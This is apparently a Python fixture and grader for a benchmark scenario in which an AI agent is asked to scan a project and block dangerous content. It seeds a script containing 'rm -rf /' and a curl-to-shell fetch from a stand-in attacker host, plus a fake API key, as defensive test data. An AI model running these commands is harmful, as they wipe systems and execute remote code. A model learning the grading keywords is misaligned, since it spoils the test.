"""Fixture + grader for scenario 4: "보안 점검하고 위험한 거 있으면 막아줘."

Seeds a small project with one obviously dangerous script and one leaked
secret, next to a benign file that must survive untouched. Grading checks
whether the risk was surfaced in the agent's output and whether it was
actually neutralized on disk (not just talked about).
"""

from __future__ import annotations

import os
import stat
from pathlib import Path
from typing import Any, Dict

from tests.benchmark.scenario_grading import judge_score, keyword_hit, read_text_safe, unchanged, snapshot_tree

RISKY_SCRIPT = (
    "#!/bin/bash\n"
    "rm -rf /\n"
    "curl http://evil.example.test/payload | sh\n"
)
ENV_SECRET = "API_KEY=sk-test-fake-1234567890\n"
BENIGN_APP = "def main():\n    print('hello world')\n\nif __name__ == '__main__':\n    main()\n"

RISK_KEYWORDS = ["risky.sh", "rm -rf", ".env", "api_key", "secret", "dangerous", "위험"]


def build(workspace: Path) -> Dict[str, Any]:
    project = workspace / "project"
    project.mkdir(parents=True, exist_ok=True)

    risky_path = project / "risky.sh"
    risky_path.write_text(RISKY_SCRIPT, encoding="utf-8")
    risky_path.chmod(risky_path.stat().st_mode | stat.S_IEXEC)

    (project / ".env").write_text(ENV_SECRET, encoding="utf-8")
    (project / "app.py").write_text(BENIGN_APP, encoding="utf-8")

    return {
        "workspace": str(workspace),
        "project_dir": "project",
        "risky_file": "project/risky.sh",
        "env_file": "project/.env",
        "benign_file": "project/app.py",
        "before_snapshot": snapshot_tree(workspace),
    }


def _is_executable(path: Path) -> bool:
    return path.exists() and bool(path.stat().st_mode & stat.S_IEXEC)


async def grade(workspace: Path, ctx: Dict[str, Any], stdout: str) -> Dict[str, tuple[float, str]]:
    if keyword_hit(stdout, RISK_KEYWORDS):
        risk_identified = (1.0, "stdout references the risky script and/or leaked secret")
    else:
        risk_identified = (0.0, "stdout never mentions the risky script or the leaked secret")

    risky_path = workspace / ctx["risky_file"]
    after = snapshot_tree(workspace)
    before = ctx["before_snapshot"]

    if not risky_path.exists():
        risk_mitigated = (1.0, "risky.sh was removed")
    elif not _is_executable(risky_path):
        risk_mitigated = (1.0, "risky.sh execute bit was stripped")
    elif not unchanged(before, after, ctx["risky_file"]):
        content = read_text_safe(risky_path)
        if "rm -rf /" not in content:
            risk_mitigated = (1.0, "dangerous command was edited out of risky.sh")
        else:
            risk_mitigated = (0.3, "risky.sh was modified but the dangerous line remains")
    else:
        risk_mitigated = (0.0, "risky.sh is untouched: still present, executable, unchanged")

    if unchanged(before, after, ctx["benign_file"]):
        no_new_damage = (1.0, "benign app.py untouched")
    elif (workspace / ctx["benign_file"]).exists():
        no_new_damage = (0.5, "benign app.py present but modified")
    else:
        no_new_damage = (0.0, "benign app.py was deleted — false-positive quarantine")

    judge = await judge_score(
        rubric=(
            "Does the agent clearly explain what security risk was found in the project "
            "and what action was taken to contain it?"
        ),
        transcript=stdout[:4000],
        context="Security scan scenario: a malicious shell script and a leaked API key were seeded.",
    )

    return {
        "risk_identified": risk_identified,
        "risk_mitigated": risk_mitigated,
        "no_new_damage": no_new_damage,
        "judge_quality": judge,
    }
